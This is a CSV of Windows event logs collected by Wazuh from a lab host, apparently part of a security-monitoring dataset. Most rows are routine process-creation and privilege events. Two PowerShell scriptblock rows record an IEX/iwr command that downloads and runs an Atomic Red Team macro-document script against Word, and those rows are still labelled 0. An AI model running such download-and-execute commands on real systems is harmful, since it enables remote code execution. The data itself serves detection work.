ts,computer,event_id,image,command_line,target_object,message,level,source,label
2025-12-02 19:43:05.944000+00:00,SocWinEP,4688,,,,"""A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x184c
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x23d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.""",3,wazuh,0
2025-12-02 19:43:05.960000+00:00,SocWinEP,4673,,,,"""A privileged service was called.

Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x184c
	Process Name:	C:\Windows\System32\conhost.exe

Service Request Information:
	Privileges:		SeProfileSingleProcessPrivilege""",4,wazuh,0
2025-12-02 19:43:06.428000+00:00,SocWinEP,4104,,,,"""Creating Scriptblock text (1 of 1):
& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""C:\AtomicRedTeam\atomics\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Scheduler""}

ScriptBlock ID: 2c0622e7-45a8-454e-bc82-8b512ce13206
Path: """,4,wazuh,0
2025-12-02 19:43:06.444000+00:00,SocWinEP,4104,,,,"""Creating Scriptblock text (1 of 1):
{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""C:\AtomicRedTeam\atomics\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Scheduler""}

ScriptBlock ID: 86e3dc41-4e21-4471-a88c-e1929b7c2d53
Path: """,4,wazuh,0
2025-12-02 19:43:06.960000+00:00,SocWinEP,4673,,,,"""A privileged service was called.

Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x23d8
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Service Request Information:
	Privileges:		SeCreateGlobalPrivilege""",4,wazuh,0
2025-12-02 19:43:07.491000+00:00,SocWinEP,11,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,,,"""File created:
RuleName: -
UtcTime: 2025-12-02 19:42:39.312
ProcessGuid: {8206e0bc-412f-692f-c702-000000001000}
ProcessId: 9176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\duser\AppData\Local\Temp\__PSScriptPolicyTest_3z0y3a0k.uli.ps1
CreationUtcTime: 2025-12-02 19:42:39.312
User: SOC\duser""",8,wazuh,0
2025-12-02 19:43:09.756000+00:00,SocWinEP,4688,,,,"""A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x22dc
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x1c24
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.""",3,wazuh,0
2025-12-02 19:43:09.772000+00:00,SocWinEP,4673,,,,"""A privileged service was called.

Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x22dc
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Service Request Information:
	Privileges:		SeProfileSingleProcessPrivilege""",4,wazuh,0
2025-12-02 19:43:09.788000+00:00,SocWinEP,4688,,,,"""A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xd4c
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x22dc
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.""",3,wazuh,0
2025-12-02 19:43:09.803000+00:00,SocWinEP,4673,,,,"""A privileged service was called.

Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0xd4c
	Process Name:	C:\Windows\System32\conhost.exe

Service Request Information:
	Privileges:		SeProfileSingleProcessPrivilege""",4,wazuh,0
2025-12-02 19:43:09.819000+00:00,SocWinEP,4673,,,,"""A privileged service was called.

Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x22dc
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Service Request Information:
	Privileges:		SeCreateGlobalPrivilege""",4,wazuh,0
2025-12-02 19:43:09.835000+00:00,SocWinEP,4688,,,,"""A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2220
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x1c24
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.""",3,wazuh,0
2025-12-02 19:43:09.850000+00:00,SocWinEP,4673,,,,"""A privileged service was called.

Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x2220
	Process Name:	C:\Windows\System32\cmd.exe

Service Request Information:
	Privileges:		SeProfileSingleProcessPrivilege""",4,wazuh,0
2025-12-02 19:43:09.866000+00:00,SocWinEP,4688,,,,"""A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x12ac
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x2220
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.""",3,wazuh,0
2025-12-02 19:43:09.881000+00:00,SocWinEP,4673,,,,"""A privileged service was called.

Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x12ac
	Process Name:	C:\Windows\System32\conhost.exe

Service Request Information:
	Privileges:		SeProfileSingleProcessPrivilege""",4,wazuh,0
2025-12-02 19:43:09.897000+00:00,SocWinEP,4688,,,,"""A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3631167090-248966842-2655285490-1106
	Account Name:		duser
	Account Domain:		SOC
	Logon ID:		0x165090

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x624
	New Process Name:	C:\Windows\System32\reg.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x2220
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.""",3,wazuh,0
